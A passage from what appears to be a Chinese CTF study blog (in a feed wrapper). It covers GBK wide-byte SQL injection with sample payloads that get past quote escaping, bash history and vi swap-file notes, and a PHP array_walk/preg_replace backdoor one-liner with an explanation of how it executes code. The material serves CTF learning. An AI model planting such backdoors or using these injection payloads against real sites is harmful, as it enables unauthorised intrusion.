class="literal">false</span> <span class="keyword">or</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>一道综合题:<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">南邮CTF-综合题2</a>及其<a href="https://a2chitect.cn/2018/02/02/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0-Web-%E7%BB%BC%E5%90%88%E9%A2%982-Writeup/" target="_blank" rel="noopener">writeup</a></p><h2 id="GBK宽字节编码漏洞-gbk-sql-injection"><a href="#GBK宽字节编码漏洞-gbk-sql-injection" class="headerlink" title="GBK宽字节编码漏洞(gbk_sql_injection)"></a>GBK宽字节编码漏洞(gbk_sql_injection)</h2><p>介绍：php中MYSQL数据库,如果是GBK编码.一定要小心GBK宽字节编码漏洞<br>正常情况下 magic_quote_gpc 为ON,如果输入</p><p><code>http://www.xxxx.com/index.php?user=11′ and 1=2 #</code></p><p>SQL语句就会变成</p><p><code>SELECT * FROM user WHERE user=’1\’ and 1=2 #’</code></p><p>自动加上了\转义，如果构造特殊的宽字节编码呢？</p><p><code>http://www.xxxx.com/index.php?user=11%df%27 and 1=2 #</code></p><p>SQL语句就变成</p><p><code>SELECT * FROM user WHERE user=’11運’ and 1=2#’</code></p><p>这样就注入上了！</p><p><code>11%df</code>会被解析成<code>11運</code>,而<code>%27</code>被邪恶的解析成<code>&#39;</code>就绕过了gpc转义,就成功构造注入了</p><h1 id="Unix-Linux相关"><a href="#Unix-Linux相关" class="headerlink" title="Unix/Linux相关"></a>Unix/Linux相关</h1><h2 id="bash-history"><a href="#bash-history" class="headerlink" title="bash_history"></a>bash_history</h2><p>Bash shell在<code>~/.bash_history</code>（<code>~/</code>表示用户目录）文件中保存了500条使用过的命令，这样可以使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个<code>.bash_history</code>文件。</p><p>为了安全，bash shell应该保存少量的命令，并且在每次用户注销时都把这些历史命令删除。</p><p>删除方法: 第一步：<code>/etc/profile</code>文件中的<code>HISTFILESIZE</code>和<code>HISTSIZE</code>行确定所有用户的<code>.bash_history</code>文件中可以保存的旧命令条数。强烈建议把把<code>/etc/profile</code>文件中的<code>HISTFILESIZE</code>和<code>HISTSIZE</code>行的值设为一个较小的数，比如30。编辑profile文件<code>vi /etc/profile</code>，把下面这行改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HISTFILESIZE=30</span><br><span class="line">HISTSIZE=30</span><br></pre></td></tr></table></figure><p>这表示每个用户的<code>.bash_history</code>文件只可以保存30条旧命令。</p><p>第二步：网管还应该在<code>/etc/skel/.bash_logout</code>文件中添加下面这行<code>rm -f $HOME/.bash_history</code>。这样，当用户每次注销时<code>.bash_history</code>文件都会被删除. </p><h2 id="vi编辑器的备份文件"><a href="#vi编辑器的备份文件" class="headerlink" title="vi编辑器的备份文件"></a>vi编辑器的备份文件</h2><p>linux下一般使用vi编辑器，并且异常退出会留下备份文件<code>xxx.swp</code></p><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><h2 id="数组回调后门"><a href="#数组回调后门" class="headerlink" title="数组回调后门"></a>数组回调后门</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'www'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'wtf'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：利用了php中回调函数的后门，可以使<code>www</code>为<code>preg_replace</code>函数，当<code>array_walk()</code>将函数作用于数组时，POST传入的数据作为<code>preg_replace()</code>的第二个参数，在替换后被当做 php 代码执行（在php5.3下可用，5.5后preg_replace函数已弃用了使替换后的字符串作为php代码执行的/e修饰符）。</p><p>测试：<br><img src="/2018/10/12/CTF/hdhs.png" alt="image"></p><p><strong>未完待续。。。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文总结了CTF中我所遇到的题型及其write up，本文长期更新&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="https://blog.suqir.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
</feed>
